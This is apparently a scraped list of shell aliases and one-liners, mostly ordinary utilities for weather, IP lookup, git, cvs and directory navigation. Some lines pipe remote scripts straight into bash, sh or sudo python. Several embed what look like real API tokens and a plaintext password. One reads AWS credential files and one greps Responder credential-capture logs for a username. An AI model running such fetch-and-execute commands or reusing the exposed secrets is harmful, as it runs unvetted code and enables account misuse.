"date +'%a, %d %b %Y %T %Z' | perl -ne 'print lc'"
"date +'%B %d, %Y' | tc"
"date +%s | pbcopy; echo ""Timestamp copied to clipboard""; date +%s;"
"date +%a | tr \""[:upper:]\"" \""[:lower:]\"""
"date +%FT%T | sed ""s/:/-/g"""
"date +""Work-%Y_%W"" | pbcopy"
"date +""Bramondo-%Y_%W"" | pbcopy"
"date +""%m-%d-%Y | %H:%M:%S"""
"date +""%d-%m-%Y (24-hrs: %T | 12-hrs: %r)"""
"date +""%Y_%W"" | pbcopy"
"date +""%Y-%m-%d"" | pbcopy"
"date +""%Y-%m-%d | %H:%M %Z"""
"date +""%Y-%m-%d %H:%M:%S"" | pbcopy"
"date +""%Y%m%d%I%M%S"" | tr -d "
"date +""%T"" | pbcopy"
"date +""%A, %d %b. %Y, %H:%M"" ; curl -s wttr.in/Omsk | head -n 7"
"date +""%A, %d %b. %Y, %H:%M"" ; curl -s wttr.in/Omsk | head -n 37"
"date ""+%Y_%m_%d %b %a %T %Z""|pbcopy"
"date ""+%Y-%m-%dT%H:%M:%S%z"" | sed -e ""s/\(.*\)\(..\)/\1:\2/"""
"date ""+%Y%m%d%H%M%S@futurepay.com"" | pbcopy"
"date ""+%Y%m%d%H%M%S"" | pbcopy"
"date ""+%H:%M""|pbcopy"
"d images -q -f ""dangling=true""|xargs -r -I@ docker rmi @"
"d images -q --filter ""dangling=true"" | xargs docker rmi"
"cygpath -alw .; pwd|sed -e ""s!/!.!g""; echo"
"cwd=`pwd`; gits=`find . | grep "".git$""`; for git in $gits; do dir=`dirname $git`; cd $dir; pwd; repo sync .; cd $cwd; done"
"cvscheck | grep ""^U"""
"cvscheck | grep ""^P"""
"cvscheck | grep ""^M"""
"cvscheck | grep ""^?"""
"cvs status \!* | grep ""File:"""
"cvs editors . | sed ""s/[ ].*//"""
"cvs -z9 -q up -P -d 2>/dev/null | grep -v ""^\?"""
"cvs -q update -Pd 2>&1 | grep -v ""cvs update: New directory"""
"cvs -nq update | grep ""^[MAC]"""
"cvs -nq update | grep ""^[A-Z]"""
"cvs -nq update -Pd 2>&1 | grep -v ""cvs update: New directory"""
"cvs -n update 2>&1 | grep -v ""^cvs"""
"cvs -n update 2>&1 | grep ""^[UPARMC?]"""
"cvs -n -q up -P -d 2>/dev/null | grep -v ""^\?"""
"cut -f1-5,7-9,12- | less -R"
"cut -f 1,6 -d: /etc/passwd | sort"
"cut -d, -f 3- | splot -d, -t"
"cut -d ""|"""
"cut -d "","" -f 3 $DROP/bob-alces-aws-credentials.csv | tail -n 1"
"cut -d "","" -f 2 $DROP/bob-alces-aws-credentials.csv | tail -n 1"
"cut -c1-$(stty size </dev/tty | cut -d"" "" -f2)"
"cut -c 1-$(stty size | cut -f 2 -d "" "")"
"curl myip.ipip.net myip.ipip.net -s --stderr - |sed -ne ""s/^.*：\([0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\).*$/\1/p"""
"curl ipecho.net/plain && echo && ifconfig | sed -En ""s/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p"""
"curl ip.sb 2>/dev/null | grep --color=never -Eo '([0-9]{1,3}\.){3}([0-9]{1,3})'"
"curl ip.gs 2>/dev/null | grep --color=never -Eo '([0-9]{1,3}\.){3}([0-9]{1,3})'"
"curl https://start.spring.io/starter.tgz -d dependencies=web,actuator -d language=java -d type=gradle-project -d baseDir=spring-project | tar -xzvf -"
"curl https://planet.openstreetmap.org/replication/minute/state.txt |\
"curl https://ifconfig.co/json | jq ""."""
"curl https://diagnostic.opendns.com/myip 2> /dev/null | ruby -e ""puts ARGF.read"""
"curl https://dev-cloud.relayr.io/oauth/userinfo --header 'Authorization: Bearer your_access_token' | jq '{userId: .userId, orgId: .orgId}'"
"curl https://api.weather.gov/gridpoints/OKX/33,35/forecast | jq '.properties.periods[0].detailedForecast'"
"curl http://rss.nytimes.com/services/xml/rss/nyt/US.xml | grep ""<description>"""
"curl http://myexternalip.com/raw; ifconfig | sed -En ""s/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p"";"
"curl climagic.org/txt/jb.txt | while read -r c n l;do printf ""\e[1;${c}m%${COLUMNS}s\e[0m\n"" "" "";play -q -n synth pl $n trim 0 $l;done"
"curl \""https://igorjan94.ru/adduser.sh\"" 2&>/dev/null | bash -s -- "
"curl -sSf https://static.rust-lang.org/rustup.sh | sh -s -- \
"curl -sSL https://api.coinbase.com/v1/prices/historical?limit=1 | sed -r ""s/(^.*)T(.*),([0-9]+\.[0-9]{1,2})/$\3 as of \1 at \2\n/"""
"curl -sSL -H ""Accept: application/json"" https://ipinfo.io/json | jq -r .ip"
"curl -sS https://vault.sandbox.glympse.com/v1/auth/github/login -d ""{ \""token\"": \""__git_token__\"" }"" | jq -r .auth.client_token"
"curl -sS https://stripe.com/healthcheck/fe | cut -f1,2 -d."
"curl -sS https://api.stripe.com/healthcheck | cut -f1,2 -d."
"curl -sS http://stripe.com/healthcheck/haproxy | cut -f1,2 -d."
"curl -sS http://cdn.fmi.fi/weather-observations/products/finland/finland-weather-observations-map.png | imgcat && ansiweather -l Tampere,FI -u metric -a false -s false"
"curl -sS ""https://api.ipify.org?format=json"" | jq ."
"curl -sL sentinel.touchtunes.com/api/v1/slo|jq """""
"curl -sL http://httpbin.org/ip | jq -r "".origin"""
"curl -sL git.io/antibody | sh -s &>/dev/null \
"curl -s www.wieistmeineip.de | egrep -o ""[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"""
"curl -s wttr.in/london | head -n 7 && printf ""\n"""
"curl -s wttr.in/lex | sed -n 3,7p"
"curl -s wttr.in/hoover,al | sed -n ""1,7p"""
"curl -s wttr.in/Ponorogo | sed -n ""1,17p"""
"curl -s wttr.in/Paris | sed -n '3,7p'"
"curl -s wttr.in/Moon?lang=en | sed -n '1,23p'"
"curl -s wttr.in/Karlsruhe?lang=de | sed -n ""2,7p"" && echo"
"curl -s wttr.in/Glasgow | sed ""$ d"""
"curl -s wttr.in/24504 | sed -n 3,7p"
"curl -s wttr.in | sed -n '1,7p'"
"curl -s wttr.in | sed -n '1,38p'"
"curl -s wttr.in | sed -n '1,17p'"
"curl -s wttr.in | sed -n ""1,7p""; echo"
"curl -s wttr.in | sed -n ""1,7p"""
"curl -s whatthecommit.com | sed -n ""s/^<p>//p"""
"curl -s randomfunfacts.com | sed -n ""s/.*<i>\(.*\)<\/i>.*/\1/p"""
"curl -s ipinfo.io |tr -d ""{}\"""""
"curl -s ipinfo.io | jq -r "".ip"""
"curl -s ipinfo.io | jq "".ip"" -r"
"curl -s internal.trilliumeng.com/gimbal_list.php | sed -n ""s/.*gimbal_ip\"">\([^<]*\).*/\1/p"""
"curl -s ifconfig.co | awk ""{print $1}"""
"curl -s https://raw.github.com/xdissent/ievms/master/ievms.sh | env INSTALL_PATH=""$IEVMS_INSTALL_PATH"" IEVMS_VERSIONS=""8 9 10 11"" bash"
"curl -s https://query1.finance.yahoo.com/v7/finance/quote\?lang\=en-US\&region\=US\&corsDomain\=finance.yahoo.com\&symbols\=MDB | jq "".quoteResponse.result[0].regularMarketPrice"""
"curl -s https://jsonip.com | grep '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' -o"
"curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | tr "","" ""\n""; echo -e ""\n"""
"curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | jq '.data.latitude, .data.longitude, .data.city_name, .data.country_name'"
"curl -s https://ip.cn | jq -r "".ip"""
"curl -s https://httpbin.org/ip | jq .origin"""
"curl -s https://ecke.lt/troll_src/effort.jpg | $(pwd)/imgcat; rm $(pwd)/imgcat; unalias ls; echo Don\'t worry, ls will work properly again, now."
"curl -s https://api.my-ip.io/ip | grep -oE ""\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"""
"curl -s https://4.ifcfg.me/ | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b'"
"curl -s httpbin.org/ip | awk ""/origin/ {gsub(\""\\\""\"", \""\""); print \$2}"""
"curl -s http://www.myip.ch | grep -oE ""([0-9]+\.?)+"""
"curl -s http://wttr.in/london%20ontario | sed -n ""1,7p"""
"curl -s http://wttr.in/Podgorica?lang=en | sed -n '1,7p'"
"curl -s http://whatismycountry.com/ |
"curl -s http://whatismijnip.nl | cut -d "" "" -f 5"
"curl -s http://selvans.net/main.shtml|grep ""Your IP:"""
"curl -s http://programmingexcuses.com/ | awk -F "">"" ""/a href/ {print substr(\$3,1,length(\$3)-3)}"""
"curl -s http://jsonip.com | grep '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' -o"
"curl -s http://feeds.reference.com/DictionarycomWordOfTheDay | sed ""/description.*:.*</!d; s/.*>\(.*\)<.*/\1/"""
"curl -s http://checkrealip.com/ | grep ""Current IP Address"""
"curl -s http://checkip.dyndns.org/ | sed ""s/[a-zA-Z<>/ :]//g"""
"curl -s http://checkip.dyndns.org/ | grep -o ""[[:digit:].]\+"""
"curl -s http://checkip.dyndns.org/ | grep -o ""[[:digit:].]\+"" "
"curl -s http://checkip.dyndns.org | sed ""s/[a-zA-Z<>/ :]//g"""
"curl -s http://checkip.dyndns.org | sed ""s/[a-zA-Z/<> :]//g"""
"curl -s http://checkip.dyndns.com/ | sed ""s/[^0-9\.]//g"""
"curl -s http://checkip.amazonaws.com/ | tr -d ""\n"""
"curl -s http://cheat.errtheblog.com/s/mongo | groovy -e ""@Grab(group=/net.sourceforge.nekohtml/, module=/nekohtml/, version=/1.9.14/)import org.cyberneko.html.parsers.SAXParser;println new XmlSlurper(new SAXParser()).parseText(System.in.text).depthFirst().find{ it.@class == /sheet/}.text()"""
"curl -s freegeoip.net/csv/$(wip) | cut -d , -f 3,6"
"curl -s checkip.dyndns.org | sed -e ""s/.*Current IP Address: //"" -e ""s/<.*$//"""
"curl -s checkip.dyndns.org | grep -Eo ""[0-9\.]+"""
"curl -s checkip.dyndns.org | \
"curl -s checkip.dyndns.com | grep -Eo ""[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"""
"curl -s -u `jq -r "".clientId"" < api-key.json`:`jq -r "".secret"" < api-key.json` https://dev-shield.rxservices.mckesson.com/mps/auth/v1/oauth/token -d ""grant_type=client_credentials""| echo ""Bearer"" `jq -r "".access_token""`"
"curl -s -X GET -H ""Cache-Control: no-cache"" -H ""Terminalfred"" ""https://api.trello.com/1/lists/569623d6blablablac4d301?cards=open&card_fields=name&fields=cards&key=`cat ~/.trello/key.secret`&token=`cat ~/.trello/token.secret`"" | jq "".cards[].name"""
"curl -s -H ""Accept: application/json"" https://ipinfo.io/json | jq ""del(.loc, .postal, .readme)"""
"curl -s -H ""Accept: application/json"" https://ipinfo.io/json | jq ""del(.loc, .postal)"""
"curl -s --data ""pesel=PESEL&imie=IMIE&nazwisko=NAZWISKO"" https://www.kierowca.pwpw.pl/PJAction.do|grep ""<P><B>"""
"curl -s ""wttr.in"" | grep -v ""^\w"""
"curl -s ""https://www.archlinux.org/mirrorlist/?country=US&protocol=https&use_mirror_status=on"" | sed -e "
"curl -s ""https://www.archlinux.org/mirrorlist/?country=DE&protocol=https&use_mirror_status=on"" | sed -e "
"curl -s ""https://www.archlinux.org/mirrorlist/?country=DE&country=PL&protocol=https&use_mirror_status=on"" | sed -e "
"curl -s ""https://wttr.in/New%20Delhi?m2"" | sed -n ""1,28p"""
"curl -s ""https://wttr.in/New%20Delhi?m2"" | sed -n ""1,27p"""
"curl -s ""https://wttr.in/Nantes?2"" | sed -n ""1,27p"""
"curl -s ""https://httpbin.org/ip"" | jq -r "".origin"""
"curl -s ""https://cdn.contentful.com/spaces/6qqte9wlq16o/entries?access_token=bab0ec81f61331d6e29f5c0e3164d8d506c5ae6957088607c0125a71124177c7"" | jq .items[0].fields"
"curl -s ""http://ip-api.com/json/$(ip)"" | jsonc"
"curl -s ""http://checkip.dyndns.org"" | sed ""s/.*Current IP Address: \([0-9\.]*\).*/\1/g"""
"curl -kv -X POST -d ""{\""username\"":\""cba\"",\""password\"":\""C0{e6ZC.|-]w\""}"" https://vmbroker.corp.netsuite.com:8080/login"
"curl -XGET $CREDENTIAL ""$ES_SCHEME://$NODE:9200/_cluster/state/?pretty=true"" 2>/dev/null | jq "".metadata.version"""
"curl -X GET -H ""Content-Type: application/json"" ${confluentRestUrl}/brokers 2> /dev/null | python -mjson.tool"
"curl -X GET ""https://api.nature.global/1/appliances"" -H ""accept: application/json"" -k --header ""Authorization: Bearer 5DF4W4jxkZA3Tpc7Gh26s_d51qjOoGTQZfZkXpn2XU8.U7VB7ux95CN9iSoLMeGnS0nRNz_vBB7ONpRm1OMz94o""|jq ."
"curl -L https://www.fossil-scm.org/fossil/uv/fossil-linux-x64-2.8.tar.gz | tar xzf /dev/stdin -C ""${HOME}/bin"""
"curl -L -s --max-time 10 http://checkip.dyndns.org | egrep -o -m 1 '([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}'"
"curl -H ""Host: pow"" -s http://localhost/status.json | json"
"curl -H ""Host: pow"" -s http://localhost/env.json | json"
"curl -H ""Host: pow"" -s http://localhost/config.json | json"
"curl -H ""Accept-Language: ru"" -s wttr.in/Москва | sed -n ""1,17p"""
"curl -H ""$(/home/fds/svc_lima/bin/lima_token $USER FDS | tr -d "
"curl -Gso /dev/null -w %{url_effective} --data-urlencode @- """" | cut -c3-"
"curl -F c=@- ""https://ptpb.pw/?u=1"" | tee >(xclip -selection clipboard)"
"curl -F ""sprunge=<-"" http://sprunge.us | xclip"
"curl -F ""sprunge=<-"" http://sprunge.us | xclip ; echo ""$(xclip -o)?lang"""
"curl -F ""sprunge=<-"" http://sprunge.us | xclip -f"
"curl -F ""sprunge=<-"" http://sprunge.us | tee >(xsel -i)"
"curl --silent whatismyyip.org | grep -oE ""[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"""
"curl --silent ifconfig.me | sed ""s/\n//"""
"curl --silent checkip.dyndns.org | ag --only-matching ""[0-9.]+"""
"curl --silent --show-error https://jaspervdj.be/lorem-markdownum/markdown.txt | sed -n ""1h;2,\$H;\${g;s/\[.*\](http.*)//g;p}"""
"curl --silent --show-error --retry 5 https://bootstrap.pypa.io/get-pip.py | sudo python3 &&\
"curl --progress-bar 'http://api.ipstack.com/check?access_key=69ccae26048dfa1170daa778ce3e0258&fields=ip,country_name,region_name,city,zip,continent_name,hostname&hostname=1' | jq"
"curl --cookie cookies.txt --cookie-jar cookies.txt -X POST ""http://localhost/dma/GetUserInfos"" | jq ."
"curl --cookie cookies.txt --cookie-jar cookies.txt -X POST ""http://localhost/dma/GetResources"" | jq ."
"curl 'wttr.in/Москва?M&lang=ru' | sed -n '1,17p'"
"curl 'http://ip-api.com/json?lang=en&fields=country,city,as,query' | jsn"
"curl ""http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25]"" | grep -v _curl_ > comfu.txt"
"curl ""$*"" | open -fa $PREVIEW"
"ctags $(find . -regex "".*\.\(cpp\|h\)"")"
"csv --fields=root @${i} | grep -q ""platforms/${PLATFORMNAME}"" ; then"
"cscope -R -q -k -b;ctags -R .;echo cscope.{in.,po.,}out tags .gitignore | sed 's/ /\n/g' >>.gitignore"
"create-gitignore list | column -s, -t"
"cpufreq-info | grep -i ""cpu freq"""
"cp ~/.xinit_log{,_old} && xinit |& tee ~/.xinit_log"
"cp \`ls -t \\\`find ~/dev/Stucco/output/ -type f -name '*.js'\\\` | head -1\` $kcrloc/lib/unminified/KindleRendererLib.js;\
"cp -vi -- ""$(ls -rtd ~/winhome/Downloads/** | tail -n1)"" "
"cp -vi -- ""$(ls -rtd . .. | tail -n1)"" ~/winhome/Downloads/"
"cp -n ~/local/misc/vscode-tasks.json .vscode/tasks.json; tmux display-message -p ""#S:#I"" | install /dev/stdin .vscode/target 2> /dev/null; code"
"cp $1 `grep UUID -A1 -a $1 | grep -io ""[-A-Z0-9]\{36\}""`"
"cp ""`/bin/ls -dtr1 *_Deployment/target/* | tail -1`"" /mnt/h/car-files/"
"cowsay -f tux ""welcome Programs, now begins your real training"" | lolcat"
"cowsay -W ""$(( $(tput cols) - 3))"" | head -n -5"
"cowsay ""Whats the password?"" | wall"
"cower --rsort=votes -s ""$*"" | head -n 5"
"copy_and_echo `git rev-parse HEAD | tr -d ""\n""`"
"convert ""$HOME/Desktop/$(ls -t ~/Desktop/ | head -1)"" -resize 50% -unsharp 1.5x1.2+1.0+0.10 -strip ~/Desktop/screenshot.png"
"convert ""$(ls -t1 *| head -1)"""
"control test ""$(uq manifest.yaml | jq --raw-output .name)"".unit"
"control test ""$(uq manifest.yaml | jq --raw-output .name)"".lint"
"control run piptools.compile ""$(uq manifest.yaml | jq --raw-output .name)"""
"control run -d ""$(uq manifest.yaml | jq --raw-output .name)"".legacy"
"control build ""$(uq manifest.yaml | jq --raw-output .name)"""
"confirm ""THIS WILL REMOVE ALL LOCAL BRANCHES THAT HAVE BEEN MERGED!"" && git fetch -p && git branch -vv | gawk "
"conda list | sed ""s/\ .*//"""
"compgen -a | each ""alias"""
"command ls -lhF ${colorflag} | grep --color=never ""^d"""
"comm -23 <(pacman -Qqe | sort ) \
"comm -23 <(pacaur -Qqt | sort) \
"column -tx -s ""%"" ~/.oh-my-zsh/custom/plugins/a-few-aliases/a-few-aliases.cheatsheet | ccat -G Comment=""green"" -G Punctuation=""darkblue"""
"column -ts""» "" | less -S"
"column -ts""» "" | head"
"column -ts $""\t"" | less"
"column -t | tr -s "" """
"column -t -s, | less -S"
"column -t -n -s ',' | less -S -R"
"column -s, -t | less -#2 -N -S"
"column -s, -t < ~/pass.csv | cat -n"
"column -s, -t < ""/usr/share/dnscrypt-proxy/dnscrypt-resolvers.csv"" | less -#5 -N -S"
"colorls -la --color | grep ""\->"""
"colo $(ls -1 ~/.colors | dmenu -i -h 1800 -w 2880 -p "" colo "" -fn ""mononoki-15"" -o .8 -nb ""$(~/xparse background)"" -nf ""$(~/xparse color1)"" -sb ""$(~/xparse background)"" -sf ""$(~/xparse foreground)"" -q) > /dev/null &!"
"code . $(conflicts | cut -d "" "" -f 2)"
"code $(git ls-files | peco --query ""$LBUFFER"")"
"cmsh -c ""device status | grep DOWN"""
"cmd=$(fc -ln -2 -2 | sed -E ""s/^[ \\t]*//; s/[ ]*\$//""); eval pet new $(printf %q ""$cmd"")"
"cmake -DCMAKE_TOOLCHAIN_FILE=${HOME}/cmake-modules/qt-android-cmake/toolchain/android.toolchain.cmake -DTARGET_PROJECT=radnav/app_radnav -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_MAKE_PROGRAM=/usr/bin/make -DCMAKE_MODULE_PATH=""$CMAKE_MODULE_PATH"" .. 2>&1 | tee asd.txt"
"clip $( cat ~/.gitkey | base64 --decode ) && echo ""Key copied to clipboard."""
"clear|g"" .bashrc"
"clear;~/bin/script/html_link_parser.sh -l ""http://www.ppomppu.co.kr/zboard/zboard.php?id=ppomppu2"" -b ""http://www.ppomppu.co.kr/zboard/"" -s ""view.php?id=ppomppu2&page=1&sn1=&divpage=4&sn=off&ss=off&sc=off&select_arrange=headnum&"" | head -15"
"clear;~/bin/script/html_link_parser.sh -l ""http://todayhumor.co.kr/board/list.php?table=bestofbest"" -b ""http://todayhumor.co.kr/board/"" -s ""\""view"" -e ""/board/list.php?kind=member&mn="" | head -15"
"clear;whoami;echo;system_profiler SPSoftwareDataType|grep ""System Version"";uname -a;echo;ifconfig en0;echo"
"clear;while :;do echo $LINES $COLUMNS $(($RANDOM%$COLUMNS)) $(printf ""\u2743\n"");sleep 0.1;done|gawk "
"clear;pwd;echo ""--------------------------------""; ls -FAlh | head; echo "" """
"clear; yes "" "" | head -n $((LINES/4))"
"clear; yes "" "" | head -n $((LINES/3))"
"clear; yes "" "" | head -n $((LINES/2))"
"clear; neofetch --ascii ""$(fortune -e ~/.config/fortunes | cowsay -f ~/.config/cowsay/cows/yin-yang.cow -W 30)"""
"clear; git status --short; fswatch -0 ./src | xargs -0 -n 1 sh -c ""clear; git status --short"""
"clear; git lg --no-merges |head; echo ""..."""
"clear&&pwd&&printf ""%*s\n"" ""${COLUMNS:-$(tput cols)}"" """" | tr "" "" -"
"clear ; find ./ -name ""*.h"" -o -name ""*.cc"" | xargs ~/workspace/main/open_tools/codereview/cpplint.py"
"clear && while : ;do uptime |cut -d, -f3- ;sleep 5 ;done"
"clear && printf ""\e[3J"" && npm start 2>&1 | h \
"clear && nodemon -e js,json,jsx,ejs,coffee . | bunyan"
"clear && nodemon -e js,json,jsx,ejs,coffee . | bunyan -l warn"
"clear && nodemon -e js,json,jsx,ejs,coffee . | bunyan -l debug"
"clear && ls -l | grep ""^d"""
"clear && ecshowenv && npm run test-data-setup -- envKey=joe && ggetuserslocal | u print --color && echo ""----------"" && uuserslocal"
"clear && echo -n $(ls ~|wc -l)"" "" && ls ~ && cl $DROPBOX_DIR"
"clear && echo -e ""$(cat ~/.bash_aliases | grep "
"clang /dev/null -xc -Oz - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -Os - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -Ofast - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -O3 - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -O2 - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -O1 - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clang /dev/null -xc -O0 - -o /dev/null -\#\#\# 2>&1 | tr "" "" ""\n"""
"clamscan -rvi --exclude-dir=""^/sys|/proc"" / >/var/tmp/clamscan.log 2>&1"
"cid | grep -Po ""(?<=@)\d+$"""
"chown -R $USER:$(groups | cut -d "" "" -f1)"
"chgrp users -R .;chmod u=rwX,g=rX,o=rX -R .;chown $(pwd |cut -d / -f 3) -R ."
"changed-files | grep ""_spec.rb$"""
"changed-files | grep "".rb$"""
"cdf ""$(fd --type d . /home/dgu | fzf)"""
"cd ~/src/github.com/;cd $(find . -type d -not -path ""*/.git/*""|fzf)"
"cd ~/rpitools; is_needed=$(git fetch 2>&1 | wc -l); if [[ ""$is_needed"" -eq 0 ]] && [[ -z ""$FORCEUPDATE"" ]]; then echo ""rpitools is up-to-date :D""; else /home/$USER/rpitools/tools/update_rpitools.bash stop; git --git-dir /home/$USER/rpitools/.git pull --rebase; if [ ""$?"" -ne 0 ]; then git --git-dir /home/$USER/rpitools/.git stash && git --git-dir /home/$USER/rpitools/.git pull --rebase; fi; ./setup.bash && source template/aliases && /home/$USER/rpitools/tools/update_rpitools.bash start; fi"
"cd ~/git/CLI_Analyzer/ApolloSAStandalone/build/standalone/staging; more package.json | jq "".window.toolbar = true"" > package2.json; mv package2.json package.json; nw"
"cd ~/dev/bossjones-github/scarlett-dbus-poc/ && workon scarlett-dbus-poc && GST_DEBUG=3,python:5,gnl*:5 python scarlett_listener.py 2>&1 | tee listener.log"
"cd ~/desktop && echo ""line.lnk"" | cmd && cd -"
"cd ~/datmo_ws/src/evo && find -name ""*.py"" | entr python3 datmo_evaluation.py"
"cd ~/code/boost-platform/everett; and docker exec -it (docker ps --format ""{{.Names}}"" | grep -i everett) python manage.py loaddata everett/fixtures/*json; and cd -"
"cd ~/CS && cd ""$(\ls -1dt */ | head -n 1)"""
"cd ~/.calcurse && c && figlet CALENDAR | lolcat && echo ----------------- && echo Today is $(date +%m/%d/%y) && echo ----------------- && echo """" && calcurse -r3 && notify-send ""Appointments for today"" ""$(calcurse -r1)"""
"cd ~ && fhere ""\.DS_Store"" | xargs rm; cd ${OLDPWD}"
"cd ~ && curl -L ""https://cli.run.pivotal.io/stable?release=linux64-binary&source=github"" | tar -xz && sudo mv cf /usr/local/bin/"
"cd has; cd src; find . -name ""*.hxx"" -o -name "".cpp"" -o -name ""*.h"" -o -name ""*.c"" | xargs ctags --c++-kinds=+p --fields=+iaS --extra=+q "
"cd `ruby -rubygems -e ""puts Gem.path"" | grep ""/usr/local""`"
"cd `pwd | sed ""s/lib/include/g""`"
"cd `pwd | sed ""s/include/lib/g""`"
"cd `pwd | sed ""s/^\/\./\//""`"
"cd `pwd | sed ""s/^\/\.*/\/\./""`"
"cd `ghq root`/`ghq list | fzf --reverse --prompt=""GIT REPOSITORY > ""`"
"cd `find . -type d -maxdepth 5 -a \! -regex "".*/\..*"" | peco`"
"cd `echo $PWD/ | sed -e ""s/\/include\//\/test\//g"" -e ""s/\/src\//\/test\//g"" -e ""s/\/test\//\/test\//g""`"
"cd `echo $PWD/ | sed -e ""s/\/include\//\/src\//g"" -e ""s/\/src\//\/src\//g"" -e ""s/\/test\//\/src\//g""`"
"cd `echo $PWD/ | sed -e ""s/\/include\//\/include\//g"" -e ""s/\/src\//\/include\//g"" -e ""s/\/test\//\/include\//g""`"
"cd `echo $PWD/ | sed -e ""s/\/include\/.*//g"" -e ""s/\/src\/.*//g"" -e ""s/\/test\/.*//g""`"
"cd `date +%F-%H-%M | xargs -I % bash -c ""mkdir %;echo %""`"
"cd /root/scripts/Responder/logs; read -p ""[*] Enter Username: "" username; grep -a Client -A 3 Responder-Session.log | grep -a -B 3 $username"
"cd /home/axel/com/atnv2/multirouter && mvn clean install -U -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i error info warn debug caused atnv2 && cd .."
"cd /home/axel/com/atnv2/model && mvn clean install -U -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i error info warn debug caused atnv2 && cd .."
"cd /home/axel/com/atnv2/frontend && mvn clean install -U -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i error info warn debug caused atnv2 && cd .."
"cd /home/axel/com/atnv2/backend && mvn clean install -U -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i error info warn debug caused atnv2 && cd .."
"cd /home/axel/com/atnv2/backend && mvn clean install -U -P Atnv2-TU,gwt-dev,resources-dev 2>&1 | h -i error info warn debug caused atnv2 && cd .."
"cd /home/axel/com/atnv2/backend && mvn clean install -P Atnv2_TU,gwt-dev,resources-dev -Dsurefire.useFile=false -Dtest=DemandeLogServiceTest#test_purge_demande_de_log test 2>&1 | && cd .."
"cd /Volumes/B-movie/archive-MASTER/06-youtube-COLLECTION ; /usr/bin/open -b ""com.apple.Preview"" ""$(ls -tr | tail -n 1)"""
"cd /Users/`whoami`/Development/iOS/Brainly; xcodebuild test -workspace brainly.xcworkspace -scheme Brainly -destination ""platform=iOS Simulator,name=iPhone 5s"" | xcpretty -t --no-utf"
"cd ./$(fd --type d | fzf-tmux +m --preview=""ls {}"")"
"cd ${DIR_PATH_FOR_TOOLBELT} && find . -name ""*.sh"" | xargs dos2unix"
"cd $SYSTEM_CVS_BASE; export CUR_PROJECT_DIR=$SYSTEM_PROJECT_BASE/`cat ~/.current_project`; cvs status `egrep -x -v ""\*{3}.+\*{3}"" $CUR_PROJECT_DIR/affected_files.txt` | grep ""Status:"""
"cd $HOME/""$(cat ~/actives.txt | peco)"""
"cd $(pwd | sed -e""s,google3,READONLY/google3,"" -e""s,READONLY/READONLY,,"")"
"cd $(ls -1d $HOME/src/*/ | fzf --height 50 --reverse --delimiter ""/"" --with-nth 5 --preview ""ls {}"")"
"cd $(if [ $(xclip -o | wc -w) -eq 1 ] && [ ""$(xclip -o)"" ]; then echo $(xclip -o); else echo ""empty copied path. tips: use cwd"" >> /dev/stderr; fi)"
"cd $(ghq root)/$(ghq list | peco --prompt ""[ghq src]"")"
"cd $(ghq root)/$(ghq list | peco --prompt ""REPOSITORY >"")"
"cd $(ghq root)/$(ghq list | peco --prompt ""GIT REPOGITORY >"")"
"cd $(ghq list -p | peco --prompt ""REPOSITORY >"" --query ""$LBUFFER"")"
"cd $(ghq list -p | fzf --prompt ""Project > "")"
"cd $(ghq list --full-path | peco --query ""$LBUFFER"")"
"cd $(find {~/Projects,~/Projects/server,~/genesiss/src,~/ansible} -maxdepth 1 -type d -print | peco --layout=bottom-up) && vim"
"cd $(find . -type d 2> /dev/null | fzf -m --border --preview=""ls {}"")"
"cd $(fd --type d | fzf --preview ""ls {} -a --color=always"")"
"cd $(fd --type d --hidden --exclude *conda* | fzf --preview ""ls {} -a --color=always"")"
"cd $(fc -l mkdir | cut -d"" "" -f3); /bin/pwd"
"cd $(emacsclient -e ""(with-current-buffer (window-buffer (frame-selected-window)) default-directory)"" | "
"cd $(emacsclient -e ""(with-current-buffer (window-buffer (frame-selected-window)) (expand-file-name default-directory))"" | "
"cd $(echo $PWD | sed ""s/aa-uid-db\//aa-uid-db.1.x\//g"" )"
"cd $(echo $PWD | sed ""s/aa-uid-db.1.x\//aa-uid-db\//g"" )"
"cd $(echo $(pwd)/|sed -e ""s#/branches/ucs-[^/]*/#/trunk/#"")"
"cd $(cat $HOME/.local/share/bash/bookmarks | fzf --reverse --height=""30%"" -e)"
"cd $(cat $FDPATH | sed ""s:^~:$HOME:"")"
"cd $(/Applications/Emacs.app/Contents/MacOS/bin/emacsclient -e ""(with-current-buffer (window-buffer (frame-selected-window)) (expand-file-name default-directory))"" | "
"cd ""`ls -dtr ./*/ | tail -n 1`"""
"cd ""`find -maxdepth 1 -type d | perl -e "
"cd ""$MPD_DIR""/""$(dirname ""$(mpc -f %file% | head -n 1)"")"""
"cd ""$(z -l -s | fzf --reverse --height 35%)"""
"cd ""$(ls ~/code/*/project/* -d | fzf)"""
